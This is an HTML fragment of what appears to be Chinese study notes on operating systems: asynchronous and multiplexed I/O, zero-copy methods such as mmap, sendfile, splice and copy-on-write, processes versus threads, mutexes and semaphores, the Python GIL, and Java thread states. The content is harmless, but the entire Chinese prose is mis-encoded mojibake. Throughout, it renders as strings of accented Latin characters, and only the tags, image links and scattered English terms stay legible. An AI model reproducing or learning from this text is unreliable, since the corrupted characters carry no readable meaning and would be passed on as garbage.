<p>è€Œåœ¨ Linux ç³»ç»Ÿä¸‹ï¼Œå¼‚æ­¥IOæ¨¡å‹åœ¨2.6ç‰ˆæœ¬æ‰å¼•å…¥ï¼Œç›®å‰å¹¶ä¸å®Œå–„ã€‚æ‰€ä»¥ï¼Œè¿™ä¹Ÿæ˜¯åœ¨Linuxä¸‹ï¼Œå®ç°é«˜å¹¶å‘ç½‘ç»œç¼–ç¨‹æ—¶éƒ½æ˜¯ä»¥ IO å¤ç”¨æ¨¡å‹æ¨¡å¼ä¸ºä¸»ã€‚</p>
<h3 id="å°ç»“ä¸€ä¸‹ï¼š"><a href="#å°ç»“ä¸€ä¸‹ï¼š" class="headerlink" title="å°ç»“ä¸€ä¸‹ï¼š"></a>å°ç»“ä¸€ä¸‹ï¼š</h3><p>å››ç§IOæ¨¡å‹ï¼Œç†è®ºä¸Šè¶Šå¾€åï¼Œé˜»å¡è¶Šå°‘ï¼Œæ•ˆç‡ä¹Ÿæ˜¯æœ€ä¼˜ã€‚åœ¨è¿™å››ç§ I&#x2F;O æ¨¡å‹ä¸­ï¼Œå‰ä¸‰ç§å±äºåŒæ­¥ I&#x2F;Oï¼Œå› ä¸ºå…¶ä¸­çœŸæ­£çš„ I&#x2F;O æ“ä½œå°†é˜»å¡çº¿ç¨‹ã€‚åªæœ‰æœ€åä¸€ç§ï¼Œæ‰æ˜¯çœŸæ­£çš„å¼‚æ­¥ I&#x2F;O æ¨¡å‹ï¼Œå¯æƒœç›®å‰Linux æ“ä½œç³»ç»Ÿå°šæ¬ å®Œå–„ã€‚</p>
<h2 id="é›¶æ‹·è´"><a href="#é›¶æ‹·è´" class="headerlink" title="é›¶æ‹·è´"></a>é›¶æ‹·è´</h2><h4 id="1-ä¼ ç»Ÿ-I-x2F-O"><a href="#1-ä¼ ç»Ÿ-I-x2F-O" class="headerlink" title="1. ä¼ ç»Ÿ I&#x2F;O"></a>1. ä¼ ç»Ÿ I&#x2F;O</h4><p>å…ˆæ¥çœ‹çœ‹ä¼ ç»Ÿæ–¹å¼ï¼Œåœ¨è¿›è¡Œä¸€æ¬¡è¯»å†™æ—¶å…±æ¶‰åŠäº†4æ¬¡ä¸Šä¸‹æ–‡åˆ‡æ¢ï¼Œ2æ¬¡ DMA æ‹·è´ä»¥åŠ2æ¬¡ CPU æ‹·è´ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848345.png" alt="screen-1535441"></p>
<h4 id="2-ç”¨æˆ·æ€ç›´æ¥IO"><a href="#2-ç”¨æˆ·æ€ç›´æ¥IO" class="headerlink" title="2. ç”¨æˆ·æ€ç›´æ¥IO"></a>2. ç”¨æˆ·æ€ç›´æ¥IO</h4><p>è¿™æ˜¯ç¬¬ä¸€ç§æ€è·¯ï¼Œä½¿åº”ç”¨è¿›ç¨‹æˆ–å¤„äºç”¨æˆ·æ€ä¸‹çš„åº“å‡½æ•°è·¨è¿‡å†…æ ¸ç›´æ¥è®¿é—®ç¡¬ä»¶ï¼Œå†…æ ¸åœ¨æ•°æ®ä¼ è¾“è¿‡ç¨‹é™¤äº†è¿›è¡Œå¿…è¦çš„è™šæ‹Ÿå­˜å‚¨é…ç½®å·¥ä½œå¤–ï¼Œä¸å‚ä¸ä»»ä½•å…¶ä»–å·¥ä½œã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848347.png" alt="screen-1535947"></p>
<p>ä½†åªé€‚ç”¨äºä¸éœ€è¦å†…æ ¸ç¼“å†²åŒºå¤„ç†çš„åº”ç”¨ç¨‹åºï¼Œè¿™äº›åº”ç”¨ç¨‹åºé€šå¸¸åœ¨è¿›ç¨‹åœ°å€ç©ºé—´æœ‰è‡ªå·±çš„æ•°æ®ç¼“å­˜æœºåˆ¶ï¼Œåˆç§°ä¸ºè‡ªç¼“å­˜åº”ç”¨ç¨‹åºï¼Œå¦‚æ•°æ®åº“ç®¡ç†ç³»ç»Ÿã€‚å…¶æ¬¡ï¼Œå›  CPU å’Œç£ç›˜ I&#x2F;O ä¹‹é—´çš„æ€§èƒ½å·®è·ï¼Œå°±ä¼šé€ æˆèµ„æºçš„æµªè´¹ï¼Œä¸€èˆ¬æ˜¯ä¼šé…åˆå¼‚æ­¥ I&#x2F;O ä½¿ç”¨ã€‚</p>
<h4 id="3-mmap"><a href="#3-mmap" class="headerlink" title="3. mmap"></a>3. mmap</h4><p>è¿™å±äºç¬¬äºŒç±»ä¼˜åŒ–ï¼Œå‡å°‘äº† 1 æ¬¡ CPU æ‹·è´ã€‚MMAP æ˜¯æ•°æ®ä¸ä¼šåˆ°è¾¾ç”¨æˆ·ç©ºé—´å†…å­˜ï¼Œåªä¼šå­˜åœ¨äºç³»ç»Ÿç©ºé—´çš„å†…å­˜ä¸Šï¼Œç”¨æˆ·ç©ºé—´ä¸ç³»ç»Ÿç©ºé—´å…±ç”¨åŒä¸€ä¸ªç¼“å†²åŒºï¼Œä¸¤è€…é€šè¿‡æ˜ å°„å…³è”ã€‚<img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848464.png" alt="screen-1773287"></p>
<p>æ•´ä¸ª MMAP è¿‡ç¨‹ï¼Œå‘ç”Ÿäº† 4 æ¬¡ä¸Šä¸‹æ–‡åˆ‡æ¢ + 1 æ¬¡ CPU æ‹·è´ + 2 æ¬¡ DMA æ‹·è´ã€‚</p>
<h4 id="4-sendfile"><a href="#4-sendfile" class="headerlink" title="4. sendfile"></a>4. sendfile</h4><p>è¿™ä¹Ÿæ˜¯ç¬¬äºŒç±»ä¼˜åŒ–ã€‚ç”¨æˆ·è¿›ç¨‹ä¸éœ€è¦å•ç‹¬è°ƒç”¨ read&#x2F;write ï¼Œè€Œæ˜¯ç›´æ¥è°ƒç”¨ sendfile() ï¼Œsendfile å†å¸®ç”¨æˆ·è°ƒç”¨ read&#x2F;write æ“ä½œã€‚æ•°æ®å¯ä»¥ç›´æ¥åœ¨å†…æ ¸ç©ºé—´è¿›è¡Œ I&#x2F;O ä¼ è¾“ï¼Œçœå»äº†æ•°æ®åœ¨ç”¨æˆ·ç©ºé—´å’Œå†…æ ¸ç©ºé—´ä¹‹é—´çš„æ‹·è´ã€‚</p>
<p>ä¸ mmap å†…å­˜æ˜ å°„æ–¹å¼ä¸åŒçš„æ˜¯ï¼Œ sendfile() è°ƒç”¨ä¸­æ•°æ®å¯¹ç”¨æˆ·ç©ºé—´æ˜¯å®Œå…¨ä¸å¯è§çš„ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™æ˜¯ä¸€æ¬¡å®Œå…¨æ„ä¹‰ä¸Šçš„æ•°æ®ä¼ è¾“è¿‡ç¨‹ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848624.png" alt="image-20200610154454498"></p>
<p>æ•´ä¸ªè¿‡ç¨‹å‘ç”Ÿ 2 æ¬¡ä¸Šä¸‹æ–‡åˆ‡æ¢ï¼Œ1 æ¬¡ CPU æ‹·è´å’Œ 2 æ¬¡ DMA æ‹·è´ã€‚</p>
<h4 id="5-sendfile-DMA-gather-copy"><a href="#5-sendfile-DMA-gather-copy" class="headerlink" title="5. sendfile + DMA gather copy"></a>5. sendfile + DMA gather copy</h4><p>åœ¨å‰é¢çš„ sendfile() æ–¹å¼ä¸­ï¼ŒCPU ä»éœ€è¦ä¸€æ¬¡æ‹·è´ï¼Œä» Linux 2.4 ç‰ˆæœ¬å¼€å§‹ï¼ŒDMA è‡ªå¸¦äº†æ”¶é›†åŠŸèƒ½ï¼Œå¯ä»¥å°†å¯¹åº”çš„æ•°æ®æè¿°ä¿¡æ¯ï¼ˆå†…å­˜åœ°å€ã€åœ°å€åç§»é‡ï¼‰è®°å½•åˆ°ç›¸åº”çš„ç½‘ç»œç¼“å†²åŒºï¼ˆ socket bufferï¼‰ï¼Œç”±DMA æ ¹æ®è¿™äº›ä¿¡æ¯ç›´æ¥å°†å†…æ ¸ç¼“å†²åŒºçš„æ•°æ®æ‹·è´åˆ°ç½‘å¡è®¾å¤‡ä¸­ï¼Œçœä¸‹äº†æœ€åä¸€æ¬¡ CPU æ‹·è´ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848672.png" alt="image-20200610154613272"></p>
<p>è¿™æ¬¡åªå‘ç”Ÿ 2 æ¬¡ä¸Šä¸‹æ–‡åˆ‡æ¢ + 2 æ¬¡ DMA æ•°æ®æ‹·è´ã€‚</p>
<h4 id="6-splice"><a href="#6-splice" class="headerlink" title="6. splice"></a>6. splice</h4><p>sendfile åªé€‚ç”¨äºå°†æ•°æ®ä»æ–‡ä»¶æ‹·è´åˆ°ç½‘å¡ä¸Šï¼Œé™å®šäº†ä½¿ç”¨èŒƒå›´ã€‚</p>
<p>splice ç³»ç»Ÿè°ƒç”¨å¯ä»¥åœ¨å†…æ ¸ç©ºé—´çš„è¯»ç¼“å†²åŒºå’Œç½‘ç»œç¼“å†²åŒºä¹‹é—´å»ºç«‹ç®¡é“ï¼Œæ”¯æŒä»»æ„ä¸¤ä¸ªæ–‡ä»¶ä¹‹é—´äº’è¿ï¼Œå¯ä»¥åœ¨æ“ä½œç³»ç»Ÿåœ°å€ç©ºé—´ä¸­æ•´å—åœ°ç§»åŠ¨æ•°æ®ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848689.png" alt="image-20200610161033841"></p>
<p>åŒæ ·å‘ç”Ÿ 2 æ¬¡ä¸Šä¸‹æ–‡åˆ‡æ¢ + 2 æ¬¡ DMA æ•°æ®æ‹·è´ã€‚</p>
<h4 id="7-å†™æ—¶å¤åˆ¶"><a href="#7-å†™æ—¶å¤åˆ¶" class="headerlink" title="7. å†™æ—¶å¤åˆ¶"></a>7. å†™æ—¶å¤åˆ¶</h4><p>è¿™ä¸ªå°±æ˜¯ç¬¬ä¸‰ç§æ€è·¯äº†ï¼ŒCOW å†™æ—¶å¤åˆ¶ã€‚</p>
<p>å½“ç”¨æˆ·è¿›ç¨‹æœ‰å†™æ“ä½œæ—¶ï¼Œå°±æŠŠè¿™å—å…±äº«çš„å†…å­˜ç©ºé—´å¤åˆ¶ä¸€ä»½åˆ°å…¶ä»–åŒºåŸŸï¼Œç»™å†™è¿›ç¨‹ä¸“ç”¨ã€‚è¿™ç§æ–¹æ³•åœ¨èƒ½å¤Ÿé™ä½ç³»ç»Ÿå¼€é”€ï¼Œå¦‚æœæŸä¸ªè¿›ç¨‹æ°¸è¿œä¸ä¼šå¯¹æ•°æ®è¿›è¡Œæ›´æ”¹ï¼Œé‚£å°±æ°¸è¿œä¸éœ€è¦æ‹·è´ã€‚</p>
<h1 id="å¹¶å‘"><a href="#å¹¶å‘" class="headerlink" title="å¹¶å‘"></a>å¹¶å‘</h1><h2 id="è¿›ç¨‹å’Œçº¿ç¨‹"><a href="#è¿›ç¨‹å’Œçº¿ç¨‹" class="headerlink" title="è¿›ç¨‹å’Œçº¿ç¨‹"></a>è¿›ç¨‹å’Œçº¿ç¨‹</h2><p>è¿›ç¨‹: è¿›ç¨‹æ˜¯ç¨‹åºçš„ä¸€æ¬¡æ‰§è¡Œè¿‡ç¨‹ï¼Œæ˜¯ç³»ç»Ÿè¿è¡Œç¨‹åºçš„åŸºæœ¬å•ä½ï¼Œå› æ­¤è¿›ç¨‹æ˜¯åŠ¨æ€çš„ã€‚ç³»ç»Ÿè¿è¡Œä¸€ä¸ªç¨‹åºå³æ˜¯ä¸€ä¸ªè¿›ç¨‹ä»åˆ›å»ºï¼Œè¿è¡Œåˆ°æ¶ˆäº¡çš„è¿‡ç¨‹ã€‚åœ¨ Java ä¸­ï¼Œå½“æˆ‘ä»¬å¯åŠ¨ main å‡½æ•°æ—¶å…¶å®å°±æ˜¯å¯åŠ¨äº†ä¸€ä¸ª JVM çš„è¿›ç¨‹ï¼Œè€Œ main å‡½æ•°æ‰€åœ¨çš„çº¿ç¨‹å°±æ˜¯è¿™ä¸ªè¿›ç¨‹ä¸­çš„ä¸€ä¸ªçº¿ç¨‹ï¼Œä¹Ÿç§°ä¸»çº¿ç¨‹; å¯åŠ¨ä¸¤ä¸ªmainå‡½æ•°å°±æ˜¯ä¸¤ä¸ªjvmè¿›ç¨‹;</p>
<p>çº¿ç¨‹: çº¿ç¨‹ä¸è¿›ç¨‹ç›¸ä¼¼ï¼Œä½†çº¿ç¨‹æ˜¯ä¸€ä¸ªæ¯”è¿›ç¨‹æ›´å°çš„æ‰§è¡Œå•ä½ã€‚ä¸€ä¸ªè¿›ç¨‹åœ¨å…¶æ‰§è¡Œçš„è¿‡ç¨‹ä¸­å¯ä»¥äº§ç”Ÿå¤šä¸ªçº¿ç¨‹ã€‚ä¸è¿›ç¨‹ä¸åŒçš„æ˜¯åŒç±»çš„å¤šä¸ªçº¿ç¨‹å…±äº«è¿›ç¨‹çš„<strong>å †</strong>å’Œ<strong>æ–¹æ³•åŒº</strong>èµ„æºï¼Œä½†æ¯ä¸ªçº¿ç¨‹æœ‰è‡ªå·±çš„<strong>ç¨‹åºè®¡æ•°å™¨</strong>ã€<strong>è™šæ‹Ÿæœºæ ˆ</strong>å’Œ<strong>æœ¬åœ°æ–¹æ³•æ ˆ</strong>ï¼Œæ‰€ä»¥ç³»ç»Ÿåœ¨äº§ç”Ÿä¸€ä¸ªçº¿ç¨‹ï¼Œæˆ–æ˜¯åœ¨å„ä¸ªçº¿ç¨‹ä¹‹é—´ä½œåˆ‡æ¢å·¥ä½œæ—¶ï¼Œè´Ÿæ‹…è¦æ¯”è¿›ç¨‹å°å¾—å¤šï¼Œä¹Ÿæ­£å› ä¸ºå¦‚æ­¤ï¼Œçº¿ç¨‹ä¹Ÿè¢«ç§°ä¸ºè½»é‡çº§è¿›ç¨‹ã€‚</p>
<ul>
<li>è®¡ç®—æœºçš„æ ¸å¿ƒæ˜¯CPUï¼Œå®ƒæ‰¿æ‹…äº†æ‰€æœ‰çš„è®¡ç®—ä»»åŠ¡ã€‚å®ƒå°±åƒä¸€åº§å·¥å‚ï¼Œæ—¶åˆ»åœ¨è¿è¡Œã€‚</li>
<li>å‡å®šå·¥å‚çš„ç”µåŠ›æœ‰é™ï¼Œä¸€æ¬¡åªèƒ½ä¾›ç»™ä¸€ä¸ªè½¦é—´ä½¿ç”¨ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸€ä¸ªè½¦é—´å¼€å·¥çš„æ—¶å€™ï¼Œå…¶ä»–è½¦é—´éƒ½å¿…é¡»åœå·¥ã€‚èƒŒåçš„å«ä¹‰å°±æ˜¯ï¼Œå•ä¸ªCPUä¸€æ¬¡åªèƒ½è¿è¡Œä¸€ä¸ªä»»åŠ¡ã€‚ç¼–è€…æ³¨: å¤šæ ¸çš„CPUå°±åƒæœ‰äº†å¤šä¸ªå‘ç”µå‚ï¼Œä½¿å¤šå·¥å‚(å¤šè¿›ç¨‹)å®ç°å¯èƒ½ã€‚</li>
<li>è¿›ç¨‹å°±å¥½æ¯”å·¥å‚çš„è½¦é—´ï¼Œå®ƒä»£è¡¨CPUæ‰€èƒ½å¤„ç†çš„å•ä¸ªä»»åŠ¡ã€‚ä»»ä¸€æ—¶åˆ»ï¼ŒCPUæ€»æ˜¯è¿è¡Œä¸€ä¸ªè¿›ç¨‹ï¼Œå…¶ä»–è¿›ç¨‹å¤„äºéè¿è¡ŒçŠ¶æ€ã€‚ï¼ˆå­è¿›ç¨‹å°±æ˜¯å·¥å‚çš„å¤åˆ¶ç‰ˆï¼Œ å„ä¸ªå·¥å‚ç‹¬ç«‹ï¼Œä¸€èˆ¬äº’ä¸å½±å“ï¼‰</li>
<li>ä¸€ä¸ªè½¦é—´é‡Œï¼ˆå¯èƒ½åªæœ‰ä¸€å°æœºå™¨ï¼‰ï¼Œå¯ä»¥æœ‰å¾ˆå¤šå·¥äººã€‚ä»–ä»¬ååŒå®Œæˆä¸€ä¸ªä»»åŠ¡ã€‚ï¼ˆç”±äºæ˜¯æµæ°´çº¿å·¥ä½œï¼Œä¸€ä¸ªçº¿ç¨‹æŒ‚äº†å¾ˆå¯èƒ½ä¼šå½±å“åˆ°æ•´ä¸ªè¿›ç¨‹ï¼Œæ¯ä¸ªå·¥äººæœ‰è‡ªå·±çš„ç‹¬æœ‰åŒºåŸŸï¼Œä¸èƒ½ç»™åˆ«äººè®¿é—®ï¼‰</li>
<li>çº¿ç¨‹å°±å¥½æ¯”è½¦é—´é‡Œçš„å·¥äººã€‚ä¸€ä¸ªè¿›ç¨‹å¯ä»¥åŒ…æ‹¬å¤šä¸ªçº¿ç¨‹ã€‚</li>
<li>è½¦é—´çš„ç©ºé—´æ˜¯å·¥äººä»¬å…±äº«çš„ï¼Œæ¯”å¦‚è®¸å¤šæˆ¿é—´æ˜¯æ¯ä¸ªå·¥äººéƒ½å¯ä»¥è¿›å‡ºçš„ã€‚è¿™è±¡å¾ä¸€ä¸ªè¿›ç¨‹çš„å†…å­˜ç©ºé—´æ˜¯å…±äº«çš„ï¼Œæ¯ä¸ªçº¿ç¨‹éƒ½å¯ä»¥ä½¿ç”¨è¿™äº›å…±äº«å†…å­˜ã€‚</li>
<li>å¯æ˜¯ï¼Œæ¯é—´æˆ¿é—´çš„å¤§å°ä¸åŒï¼Œæœ‰äº›æˆ¿é—´æœ€å¤šåªèƒ½å®¹çº³ä¸€ä¸ªäººï¼Œæ¯”å¦‚å•æ‰€ã€‚é‡Œé¢æœ‰äººçš„æ—¶å€™ï¼Œå…¶ä»–äººå°±ä¸èƒ½è¿›å»äº†ã€‚è¿™ä»£è¡¨ä¸€ä¸ªçº¿ç¨‹ä½¿ç”¨æŸäº›å…±äº«å†…å­˜æ—¶ï¼Œå…¶ä»–çº¿ç¨‹å¿…é¡»ç­‰å®ƒç»“æŸï¼Œæ‰èƒ½ä½¿ç”¨è¿™ä¸€å—å†…å­˜ã€‚</li>
<li>ä¸€ä¸ªé˜²æ­¢ä»–äººè¿›å…¥çš„ç®€å•æ–¹æ³•ï¼Œå°±æ˜¯é—¨å£åŠ ä¸€æŠŠé”ã€‚å…ˆåˆ°çš„äººé”ä¸Šé—¨ï¼Œååˆ°çš„äººçœ‹åˆ°ä¸Šé”ï¼Œå°±åœ¨é—¨å£æ’é˜Ÿï¼Œç­‰é”æ‰“å¼€å†è¿›å»ã€‚è¿™å°±å«â€äº’æ–¥é”â€ï¼ˆMutual exclusionï¼Œç¼©å†™ Mutexï¼‰ï¼Œé˜²æ­¢å¤šä¸ªçº¿ç¨‹åŒæ—¶è¯»å†™æŸä¸€å—å†…å­˜åŒºåŸŸã€‚</li>
<li>è¿˜æœ‰äº›æˆ¿é—´ï¼Œå¯ä»¥åŒæ—¶å®¹çº³nä¸ªäººï¼Œæ¯”å¦‚å¨æˆ¿ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœäººæ•°å¤§äºnï¼Œå¤šå‡ºæ¥çš„äººåªèƒ½åœ¨å¤–é¢ç­‰ç€ã€‚è¿™å¥½æ¯”æŸäº›å†…å­˜åŒºåŸŸï¼Œåªèƒ½ä¾›ç»™å›ºå®šæ•°ç›®çš„çº¿ç¨‹ä½¿ç”¨ã€‚</li>
<li>è¿™æ—¶çš„è§£å†³æ–¹æ³•ï¼Œå°±æ˜¯åœ¨é—¨å£æŒ‚næŠŠé’¥åŒ™ã€‚è¿›å»çš„äººå°±å–ä¸€æŠŠé’¥åŒ™ï¼Œå‡ºæ¥æ—¶å†æŠŠé’¥åŒ™æŒ‚å›åŸå¤„ã€‚ååˆ°çš„äººå‘ç°é’¥åŒ™æ¶ç©ºäº†ï¼Œå°±çŸ¥é“å¿…é¡»åœ¨é—¨å£æ’é˜Ÿç­‰ç€äº†ã€‚è¿™ç§åšæ³•å«åšâ€ä¿¡å·é‡â€ï¼ˆSemaphoreï¼‰ï¼Œç”¨æ¥ä¿è¯å¤šä¸ªçº¿ç¨‹ä¸ä¼šäº’ç›¸å†²çªã€‚</li>
<li>ä¸éš¾çœ‹å‡ºï¼Œmutexæ˜¯semaphoreçš„ä¸€ç§ç‰¹æ®Šæƒ…å†µï¼ˆn&#x3D;1æ—¶ï¼‰ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå®Œå…¨å¯ä»¥ç”¨åè€…æ›¿ä»£å‰è€…ã€‚ä½†æ˜¯ï¼Œå› ä¸ºmutexè¾ƒä¸ºç®€å•ï¼Œä¸”æ•ˆç‡é«˜ï¼Œæ‰€ä»¥åœ¨å¿…é¡»ä¿è¯èµ„æºç‹¬å çš„æƒ…å†µä¸‹ï¼Œè¿˜æ˜¯é‡‡ç”¨è¿™ç§è®¾è®¡ã€‚</li>
</ul>
<h3 id="å¤šè¿›ç¨‹ç¼–ç¨‹å’Œå¤šçº¿ç¨‹ç¼–ç¨‹çš„ä¼˜ç¼ºç‚¹"><a href="#å¤šè¿›ç¨‹ç¼–ç¨‹å’Œå¤šçº¿ç¨‹ç¼–ç¨‹çš„ä¼˜ç¼ºç‚¹" class="headerlink" title="å¤šè¿›ç¨‹ç¼–ç¨‹å’Œå¤šçº¿ç¨‹ç¼–ç¨‹çš„ä¼˜ç¼ºç‚¹"></a>å¤šè¿›ç¨‹ç¼–ç¨‹å’Œå¤šçº¿ç¨‹ç¼–ç¨‹çš„ä¼˜ç¼ºç‚¹</h3><p>å¤šè¿›ç¨‹ç¼–ç¨‹å’Œå¤šçº¿ç¨‹ç¼–ç¨‹ï¼Œéƒ½å¯ä»¥ä½¿ç”¨å¹¶è¡Œæœºåˆ¶æ¥æå‡ç³»ç»Ÿçš„è¿è¡Œæ•ˆç‡ã€‚äºŒè€…çš„åŒºåˆ«åœ¨äºè¿è¡Œæ—¶æ‰€å çš„å†…å­˜åˆ†å¸ƒä¸åŒï¼Œå¤šçº¿ç¨‹æ˜¯å…±ç”¨ä¸€å¥—å†…å­˜çš„ä»£ç å—åŒºé—´ï¼›è€Œå¤šè¿›ç¨‹æ˜¯å„ç”¨ä¸€å¥—ç‹¬ç«‹çš„å†…å­˜åŒºé—´ã€‚</p>
<p>å¤šè¿›ç¨‹çš„ä¼˜ç‚¹æ˜¯ç¨³å®šæ€§å¥½ï¼Œä¸€ä¸ªå­è¿›ç¨‹å´©æºƒäº†ï¼Œä¸ä¼šå½±å“ä¸»è¿›ç¨‹ä»¥åŠå…¶ä½™è¿›ç¨‹ã€‚åŸºäºè¿™ä¸ªç‰¹æ€§ï¼Œå¸¸å¸¸ä¼šç”¨å¤šè¿›ç¨‹æ¥å®ç°å®ˆæŠ¤æœåŠ¡å™¨çš„åŠŸèƒ½ã€‚</p>
<p>å¤šè¿›ç¨‹ç¼–ç¨‹ä¹Ÿæœ‰ä¸è¶³ï¼Œå³åˆ›å»ºè¿›ç¨‹çš„ä»£ä»·éå¸¸å¤§ï¼Œå› ä¸ºæ“ä½œç³»ç»Ÿè¦ç»™æ¯ä¸ªè¿›ç¨‹åˆ†é…å›ºå®šçš„èµ„æºï¼Œå¹¶ä¸”æ“ä½œç³»ç»Ÿå¯¹è¿›ç¨‹çš„æ€»æ•°ä¼šæœ‰ä¸€å®šçš„é™åˆ¶ï¼Œè‹¥è¿›ç¨‹è¿‡å¤šï¼Œæ“ä½œç³»ç»Ÿè°ƒåº¦éƒ½ä¼šå­˜åœ¨é—®é¢˜ï¼Œä¼šé€ æˆå‡æ­»çŠ¶æ€ã€‚</p>
<p>å¤šçº¿ç¨‹ç¼–ç¨‹çš„ä¼˜ç‚¹æ˜¯æ•ˆç‡è¾ƒé«˜ä¸€äº›ï¼Œé€‚ç”¨äºæ‰¹å¤„ç†ä»»åŠ¡ç­‰åŠŸèƒ½ï¼›ä¸è¶³ä¹‹å¤„åœ¨äºï¼Œä»»ä½•ä¸€ä¸ªçº¿ç¨‹å´©æºƒéƒ½å¯èƒ½é€ æˆæ•´ä¸ªè¿›ç¨‹çš„å´©æºƒï¼Œå› ä¸ºå®ƒä»¬å…±äº«äº†è¿›ç¨‹çš„å†…å­˜èµ„æºæ± ã€‚</p>
<p>æ—¢ç„¶å¤šçº¿ç¨‹ç¼–ç¨‹å’Œå¤šè¿›ç¨‹ç¼–ç¨‹å„æœ‰ä¼˜ç¼ºç‚¹ï¼Œå› æ­¤å®ƒä»¬åˆ†åˆ«é€‚ç”¨äºä¸åŒçš„åœºæ™¯ã€‚æ¯”å¦‚è¯´ï¼ˆpythonï¼‰ï¼Œå¯¹äºè®¡ç®—å¯†é›†å‹çš„ä»»åŠ¡ï¼Œå¤šè¿›ç¨‹æ•ˆç‡ä¼šæ›´é«˜ä¸€ä¸‹ï¼›è€Œå¯¹äºIOå¯†é›†å‹çš„ä»»åŠ¡ï¼ˆæ¯”å¦‚æ–‡ä»¶æ“ä½œï¼Œç½‘ç»œçˆ¬è™«ï¼‰ï¼Œé‡‡ç”¨å¤šçº¿ç¨‹ç¼–ç¨‹æ•ˆç‡æ›´é«˜ã€‚ä¸ºä»€ä¹ˆæ˜¯è¿™æ ·å‘¢ï¼Ÿ</p>
<p>å…¶å®ä¹Ÿä¸éš¾ç†è§£ã€‚å¯¹äº IO å¯†é›†å‹æ“ä½œï¼Œå¤§éƒ¨åˆ†æ¶ˆè€—æ—¶é—´å…¶å®æ˜¯ç­‰å¾…æ—¶é—´ï¼Œåœ¨ç­‰å¾…æ—¶é—´ä¸­ï¼Œ<a href="http://c.biancheng.net/python/">Python</a>ä¼šé‡Šæ”¾GILä¾›æ–°çš„çº¿ç¨‹ä½¿ç”¨ï¼Œå®ç°äº†çº¿ç¨‹é—´çš„åˆ‡æ¢ï¼›ç›¸åå¯¹äº CPU å¯†é›†å‹ä»£ç ï¼Œ2 ä¸ª CPU å¹²æ´»è‚¯å®šæ¯”ä¸€ä¸ª CPU å¿«å¾ˆå¤šã€‚</p>
<p>Pythonï¼Œç‰¹æŒ‡CPythonçš„å®ç°ï¼Œç”±äºGILçš„å­˜åœ¨ï¼ŒCPythonä¸èƒ½æœ‰æ•ˆçš„åˆ©ç”¨å¤šæ ¸å¤„ç†å™¨ã€‚è¡¨ç°ä¸ºä»»æ„æ—¶é—´ä¸€ä¸ªè¿›ç¨‹åªæœ‰ä¸€ä¸ªçº¿ç¨‹åœ¨è·‘ï¼Œè€ŒIOå¯†é›†å‹è¿ç®—ï¼Œå¤šæ•°æ˜¯åœ¨IOè¯»å†™å°†çº¿ç¨‹å µå¡æ‰äº†ï¼Œè¿™ä¸ªæ—¶å€™çº¿ç¨‹åˆ‡æ¢æ˜¯å¾ˆåˆç†çš„ï¼Œåæ­£çº¿ç¨‹åªæ˜¯å•çº¯åœ°ç­‰å¾…ï¼Œåœ¨è¿™ä¸ªç­‰å¾…çš„æ—¶å€™å»åšå…¶ä»–çš„äº‹æƒ…ï¼Œèµ„æºåˆ©ç”¨ç‡å°±ä¸Šå»äº†ã€‚</p>
<p>åœ¨å¤§å‹çš„è®¡ç®—æœºé›†ç¾¤ç³»ç»Ÿä¸­ï¼Œé€šå¸¸éƒ½ä¼šå°†å¤šè¿›ç¨‹ç¨‹åºåˆ†å¸ƒè¿è¡Œåœ¨ä¸åŒçš„è®¡ç®—æœºä¸ŠååŒå·¥ä½œã€‚è€Œæ¯ä¸€å°è®¡ç®—æœºä¸Šçš„è¿›ç¨‹å†…éƒ¨ï¼Œåˆä¼šç”±å¤šä¸ªçº¿ç¨‹æ¥å¹¶è¡Œå·¥ä½œã€‚</p>
<p>æ³¨æ„ï¼Œå¯¹äºä»»åŠ¡æ•°æ¥è¯´ï¼Œæ— è®ºæ˜¯å¤šè¿›ç¨‹ç¼–ç¨‹æˆ–è€…å¤šçº¿ç¨‹ç¼–ç¨‹ï¼Œå…¶è¿›ç¨‹æ•°æˆ–çº¿ç¨‹æ•°éƒ½ä¸èƒ½å¤ªå¤šï¼š</p>
<ul>
<li>å¯¹äºå¤šè¿›ç¨‹ç¼–ç¨‹æ¥è¯´ï¼Œæ“ä½œç³»ç»Ÿåœ¨åˆ‡æ¢ä»»åŠ¡æ—¶ï¼Œä¼šæœ‰ä¸€ç³»åˆ—çš„ä¿æŠ¤ç°åœºæªæ–½ï¼Œè¿™è¦èŠ±è´¹ç›¸å½“å¤šçš„ç³»ç»Ÿèµ„æºï¼Œè‹¥ä»»åŠ¡è¿‡å¤šï¼Œåˆ™å¤§éƒ¨åˆ†èµ„æºéƒ½è¢«ç”¨åšå¹²è¿™äº›äº†ï¼Œç»“æœå°±æ˜¯æ‰€æœ‰ä»»åŠ¡éƒ½åšä¸å¥½ï¼›</li>
<li>å¤šçº¿ç¨‹ç¼–ç¨‹ä¹Ÿä¸æ˜¯çº¿ç¨‹ä¸ªæ•°è¶Šå¤šæ•ˆç‡è¶Šé«˜ï¼Œé€šè¿‡ä¸‹é¢çš„å…¬å¼å¯ä»¥è®¡ç®—å‡ºçº¿ç¨‹æ•°é‡æœ€ä¼˜çš„ä¸€ä¸ªå‚è€ƒå€¼ã€‚</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848694.gif" alt="img"></p>
<h3 id="çº¿ç¨‹çš„ç”Ÿå‘½å‘¨æœŸå’ŒçŠ¶æ€"><a href="#çº¿ç¨‹çš„ç”Ÿå‘½å‘¨æœŸå’ŒçŠ¶æ€" class="headerlink" title="çº¿ç¨‹çš„ç”Ÿå‘½å‘¨æœŸå’ŒçŠ¶æ€?"></a>çº¿ç¨‹çš„ç”Ÿå‘½å‘¨æœŸå’ŒçŠ¶æ€?</h3><p>new,runnable(å°±ç»ªå’Œè¿è¡Œ),blocked,waiting,time_waiting, terminated; </p>
